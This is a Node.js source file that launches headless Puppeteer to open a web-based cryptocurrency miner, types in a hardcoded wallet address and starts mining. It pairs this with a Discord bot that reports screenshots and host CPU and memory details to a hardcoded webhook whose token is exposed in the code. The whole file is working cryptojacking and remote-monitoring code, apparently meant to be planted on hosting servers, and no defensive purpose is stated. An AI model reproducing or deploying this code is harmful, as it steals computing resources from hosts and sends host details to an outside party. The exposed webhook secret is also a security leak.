const express = require("express");
const path = require("path");
const puppeteer = require("puppeteer");
const os = require('os');
const dotenv = require('dotenv');
const axios = require('axios');
const Eris = require('eris');
const fs = require('fs');
const FormData = require('form-data');
const fetch = require('node-fetch');

dotenv.config();

const app = express();
const bot = new Eris(process.env.TOKEN);
const botId = process.env.BOT_ID;

function delay(time) {
  return new Promise(resolve => setTimeout(resolve, time));
}

let page;

const webhookUrl = 'https://discord.com/api/webhooks/1045109813228621825/OMXSsYZoA76MRjyJS4ocziJwerv_mm16w0RordAQ4is_7nXiKmqkCJZFW80I8_5hY-QZ';

async function sendToDiscord(message, retryCount = 3) {
  try {
    const formData = new FormData();
    formData.append('content', message);

    const headers = {
      ...formData.getHeaders()
    };

    await axios.post(webhookUrl, formData, { headers });

    console.log('Message sent to Discord:', message);
  } catch (error) {
    if (error.response && error.response.status === 429 && retryCount > 0) {
      const retryAfter = error.response.headers['retry-after'] || 1;
      console.log(`Rate limited. Retrying after ${retryAfter} seconds...`);
      await delay(retryAfter * 1000);
      await sendToDiscord(message, retryCount - 1);
    } else {
      console.error('Error sending message to Discord:', error);
    }
  }
}

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

(async () => {
  let browser;
  try {
    browser = await puppeteer.launch({ args: ["--no-sandbox"] });
    const pages = await browser.pages();
    page = pages[0];

    const url = "https://excessive-sticky-traffic.glitch.me/";
    await page.goto(url, { waitUntil: "domcontentloaded" });
    console.log('URL Opened')
    await delay(2000);

    const inputSelector = '#AddrField';
    const WalletAddress = '43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc';

    await page.type(inputSelector, WalletAddress);
    await page.keyboard.press("Enter");
    await delay(2000);

    await page.click('#WebMinerBtn');

    console.log(await page.title()); // Log the page title for verification

    const message = `Started mining on server ${botId} with wallet address: ${WalletAddress}`;
    console.log(message); // Log the message to the console
  } catch (err) {
    console.error(err.message);
    const errorMessage = `Error: ${err.message} on server ${botId}`;
    await sendToDiscord(errorMessage);
  } finally {
    // Optionally close the browser here if needed
    // await browser?.close();
  }
})();

async function sendSystemDetails() {
  try {
    const totalMemory = os.totalmem();
    const freeMemory = os.freemem();
    const usedMemory = totalMemory - freeMemory;

    const toMB = (bytes) => (bytes / 1024 / 1024).toFixed(2);

    const memoryMessage = `**System Memory:**\nTotal: ${toMB(totalMemory)} MB\nFree: ${toMB(freeMemory)} MB\nUsed: ${toMB(usedMemory)} MB`;

    const cpus = os.cpus();
    let cpuMessage = '**CPU Details:**\n';
    cpus.forEach((cpu, index) => {
      cpuMessage += `CPU ${index + 1}:\n`;
      cpuMessage += `  Model: ${cpu.model}\n`;
      cpuMessage += `  Speed: ${cpu.speed} MHz\n`;
      cpuMessage += `  Times:\n`;
      cpuMessage += `    User: ${cpu.times.user} ms\n`;
      cpuMessage += `    Nice: ${cpu.times.nice} ms\n`;
      cpuMessage += `    Sys: ${cpu.times.sys} ms\n`;
      cpuMessage += `    Idle: ${cpu.times.idle} ms\n`;
      cpuMessage += `    IRQ: ${cpu.times.irq} ms\n\n`;
    });

    const message = `${memoryMessage}\n${cpuMessage}`;
    return message;
  } catch (error) {
    console.error('Error fetching system details:', error);
    return `Error fetching system details: ${error.message}`;
  }
}

async function takeScreenshot() {
  if (!page) {
    throw new Error("Page is not initialized.");
  }

  const screenshotPath = 'screenshot.png';
  await page.screenshot({ path: screenshotPath });
  return screenshotPath;
}

bot.on('ready', () => {
  console.log('Ready!');
});

bot.on('messageCreate', async (msg) => {
  if (msg.content === `screenshot-${botId}`) {
    try {
      const screenshotPath = await takeScreenshot();

      if (!fs.existsSync(screenshotPath)) {
        console.error('Screenshot file does not exist');
        return;
      }

      const stats = fs.statSync(screenshotPath);
      console.log(`Screenshot file size: ${stats.size} bytes`);

      if (stats.size === 0) {
        console.error('Screenshot file is empty');
        return;
      }

      const screenshotFile = fs.createReadStream(screenshotPath);
      const formData = new FormData();
      formData.append('file', screenshotFile, { filename: 'screenshot.png' });

      // Ensure the headers are correctly set
      const headers = {
        Authorization: `Bot ${process.env.DISCORD_BOT_TOKEN}`,
        ...formData.getHeaders(),
      };

      const response = await fetch(`https://discord.com/api/v9/channels/${msg.channel.id}/messages`, {
        method: 'POST',
        headers: headers,
        body: formData,
      });

      if (!response.ok) {
        throw new Error(`Error sending screenshot: ${response.statusText}`);
      }

      const responseBody = await response.json();
      console.log('Screenshot sent successfully:', responseBody);
    } catch (err) {
      console.error('Error sending screenshot:', err.message || err);
      const errorMessage = `Error sending screenshot: ${err.message || err} on server ${botId}`;
      await sendToDiscord(errorMessage);
    }
  } else if (msg.content === `systemdetails-${botId}`) {
    try {
      const systemDetailsMessage = await sendSystemDetails();
      await sendToDiscord(systemDetailsMessage);
      console.log('System details sent successfully');
    } catch (err) {
      console.error('Error sending system details:', err.message || err);
      const errorMessage = `Error sending system details: ${err.message || err} on server ${botId}`;
      await sendToDiscord(errorMessage);
    }
  } else if (msg.content === `restart-${botId}`) {
    console.log("Restarting server....")
  }
});

bot.connect();

const listener = app.listen(process.env.PORT || 3000, () => {
  console.log(`Your app is listening on port ${listener.address().port}`);
});
